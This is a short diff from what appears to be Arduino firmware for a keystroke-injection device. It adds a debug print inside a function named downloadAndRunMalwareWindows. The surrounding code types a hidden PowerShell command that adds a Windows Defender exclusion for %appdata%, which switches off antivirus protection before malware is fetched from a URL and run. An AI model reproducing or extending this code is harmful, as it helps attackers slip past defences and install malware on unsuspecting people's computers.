@@ -466,6 +466,7 @@ void openTerminalMultiOs(){
 }
 
 void downloadAndRunMalwareWindows(String url){
+  Serial.println("url "+url);
   // Add windows defender exception
   Keyboard.println(F("powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%"));
   Keyboard.releaseAll(); 
